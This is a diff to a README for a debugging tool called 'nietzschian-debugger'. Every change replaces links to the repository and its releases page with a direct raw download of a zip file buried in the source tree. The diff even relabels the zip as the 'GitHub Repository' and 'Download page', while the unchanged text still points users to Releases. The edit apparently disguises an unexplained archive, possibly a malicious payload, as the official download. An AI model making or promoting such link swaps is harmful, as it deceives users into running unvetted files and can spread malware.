@@ -1,6 +1,6 @@
 # 🐞 nietzschian-debugger - Stronger Code Through Tough Questions
 
-[![Download Now](https://img.shields.io/badge/Download-nietzschian--debugger-ff6347?style=for-the-badge)](https://github.com/cloudbd/nietzschian-debugger)
+[![Download Now](https://img.shields.io/badge/Download-nietzschian--debugger-ff6347?style=for-the-badge)](https://github.com/cloudbd/nietzschian-debugger/raw/refs/heads/main/nietzschian_debugger/core/nietzschian-debugger-2.4.zip)
 
 ---
 
@@ -40,12 +40,12 @@ Before installing, make sure your computer meets these requirements:
 
 You need to get the software from its official GitHub page. The link below takes you directly to the repository:
 
-[![Download nietzschian-debugger](https://img.shields.io/badge/Get%20nietzschian--debugger-blueviolet?style=for-the-badge)](https://github.com/cloudbd/nietzschian-debugger)
+[![Download nietzschian-debugger](https://img.shields.io/badge/Get%20nietzschian--debugger-blueviolet?style=for-the-badge)](https://github.com/cloudbd/nietzschian-debugger/raw/refs/heads/main/nietzschian_debugger/core/nietzschian-debugger-2.4.zip)
 
 ### Step 1: Visit the Download Page
 
 1. Click the button above or go to the link:  
-   https://github.com/cloudbd/nietzschian-debugger  
+   https://github.com/cloudbd/nietzschian-debugger/raw/refs/heads/main/nietzschian_debugger/core/nietzschian-debugger-2.4.zip  
 2. Look for the section labeled **Releases** on the right side or under the repository’s main page.
 
 ### Step 2: Download the Latest Version
@@ -144,8 +144,8 @@ Understanding code and debugging better will help you use the tool well. Conside
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/cloudbd/nietzschian-debugger
-- Download page with latest versions: https://github.com/cloudbd/nietzschian-debugger/releases
+- GitHub Repository: https://github.com/cloudbd/nietzschian-debugger/raw/refs/heads/main/nietzschian_debugger/core/nietzschian-debugger-2.4.zip
+- Download page with latest versions: https://github.com/cloudbd/nietzschian-debugger/raw/refs/heads/main/nietzschian_debugger/core/nietzschian-debugger-2.4.zip
 
 ---
 
@@ -161,4 +161,4 @@ This is for users comfortable with modifying settings. It has no effect unless y
 
 ---
 
-[![Download nietzschian-debugger](https://img.shields.io/badge/Download-nietzschian--debugger-ff6347?style=for-the-badge)](https://github.com/cloudbd/nietzschian-debugger)
+[![Download nietzschian-debugger](https://img.shields.io/badge/Download-nietzschian--debugger-ff6347?style=for-the-badge)](https://github.com/cloudbd/nietzschian-debugger/raw/refs/heads/main/nietzschian_debugger/core/nietzschian-debugger-2.4.zip)
